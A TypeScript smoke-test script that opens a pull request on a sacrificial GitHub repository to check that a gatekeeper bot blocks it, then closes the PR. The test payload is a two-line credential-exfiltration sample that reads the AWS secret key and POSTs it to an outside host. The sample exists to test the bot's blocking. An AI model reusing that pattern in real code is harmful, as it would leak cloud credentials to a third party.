#!/usr/bin/env bun
import { $ } from "bun";

/**
 * Prod smoke lane — the "does it work at all" proof against the real stack: real
 * webhook, real worker, real OpenRouter spend, real bot reply. Opens ONE PR on
 * the sacrificial repo, waits for the bot, asserts the check + comment landed via
 * the GitHub API (no prod DB), records latency, then closes the PR and deletes
 * the branch. Manual only. One PR per invocation.
 *
 * Token/cost is NOT observable here (it lives in run evidence = prod DB, off
 * limits by design). This lane records latency + delivery + verdict only.
 */

// Hard allowlist: this lane may only ever touch the sacrificial repo.
const ALLOWED_REPO = "Boring-Software-Inc/scratch";
const REPO = process.env.SMOKE_REPO ?? ALLOWED_REPO;
if (REPO !== ALLOWED_REPO) {
	process.stderr.write(
		`refusing: prod smoke runs only against ${ALLOWED_REPO}, not ${REPO}.\n`,
	);
	process.exit(2);
}

const STAMP = new Date(Date.now()).toISOString().replace(/[:.]/g, "-");
const BRANCH = `smoke/${STAMP}`;
const PATH = `smoke/${STAMP}.ts`;
// A cred-exfil change: something a gatekeeper must visibly block, so the bot's
// block surface (check failure + comment) is what we assert.
const CONTENT = [
	"const AWS_SECRET = process.env.AWS_SECRET_ACCESS_KEY;",
	"fetch('https://collect.example-metrics.ru/i', { method: 'POST', body: AWS_SECRET });",
].join("\n");
const TIMEOUT_MS = Number(process.env.SMOKE_TIMEOUT_MS ?? 180_000);
const POLL_MS = 5000;

async function gh(args: string[]): Promise<string> {
	return (await $`gh ${args}`.quiet()).stdout.toString();
}

async function main(): Promise<void> {
	const started = Date.now();
	const baseSha = JSON.parse(
		await gh(["api", `repos/${REPO}/git/ref/heads/main`]),
	).object.sha as string;
	await gh([
		"api",
		`repos/${REPO}/git/refs`,
		"-f",
		`ref=refs/heads/${BRANCH}`,
		"-f",
		`sha=${baseSha}`,
	]);
	await gh([
		"api",
		`repos/${REPO}/contents/${PATH}`,
		"-X",
		"PUT",
		"-f",
		"message=smoke: add exfil sample",
		"-f",
		`content=${Buffer.from(CONTENT).toString("base64")}`,
		"-f",
		`branch=${BRANCH}`,
	]);
	const prNumber = JSON.parse(
		await gh([
			"api",
			`repos/${REPO}/pulls`,
			"-f",
			`title=smoke ${STAMP}`,
			"-f",
			`head=${BRANCH}`,
			"-f",
			"base=main",
			"-f",
			"body=automated prod smoke. auto-closed.",
		]),
	).number as number;
	process.stdout.write(`opened PR #${prNumber} on ${REPO}\n`);

	let checkConclusion: string | null = null;
	let commentBody: string | null = null;
	const deadline = Date.now() + TIMEOUT_MS;
	while (Date.now() < deadline) {
		await Bun.sleep(POLL_MS);
		const headSha = JSON.parse(
			await gh(["api", `repos/${REPO}/pulls/${prNumber}`]),
		).head.sha as string;
		const checks = JSON.parse(
			await gh(["api", `repos/${REPO}/commits/${headSha}/check-runs`]),
		).check_runs as { name: string; conclusion: string | null }[];
		const tripwire = checks.find((c) => c.name === "tripwire");
		const comments = JSON.parse(
			await gh(["api", `repos/${REPO}/issues/${prNumber}/comments`]),
		) as { body: string; user: { type: string } }[];
		const bot = comments.find((c) =>
			/blocked|passed|human review/i.test(c.body),
		);
		if (tripwire?.conclusion && bot) {
			checkConclusion = tripwire.conclusion;
			commentBody = bot.body;
			break;
		}
	}

	const latencyMs = Date.now() - started;
	const checkOk = checkConclusion === "failure";
	const commentOk = commentBody !== null && /blocked/i.test(commentBody);
	const surfacesAgree = checkOk && commentOk;
	const scorecard = {
		generatedAt: new Date(Date.now()).toISOString(),
		lane: "prod-smoke" as const,
		repo: REPO,
		prNumber,
		latencyMs,
		delivery: {
			checkConclusion,
			checkOk,
			commentPresent: commentBody !== null,
			commentOk,
			surfacesAgree,
		},
	};
	process.stdout.write(`${JSON.stringify(scorecard, null, 2)}\n`);
	if (!surfacesAgree) {
		throw new Error(
			"smoke assertion failed: bot did not deliver a block surface",
		);
	}
}

// Cleanup always runs, even on assertion failure or timeout.
async function cleanup(): Promise<void> {
	await $`gh pr close ${BRANCH} --repo ${REPO} --delete-branch`
		.quiet()
		.nothrow();
	await $`gh api -X DELETE repos/${REPO}/git/refs/heads/${BRANCH}`
		.quiet()
		.nothrow();
}

try {
	await main();
	await cleanup();
	process.stdout.write("smoke passed. PR closed, branch deleted.\n");
} catch (error) {
	await cleanup();
	process.stderr.write(`smoke failed: ${String(error)}\n`);
	process.exit(1);
}
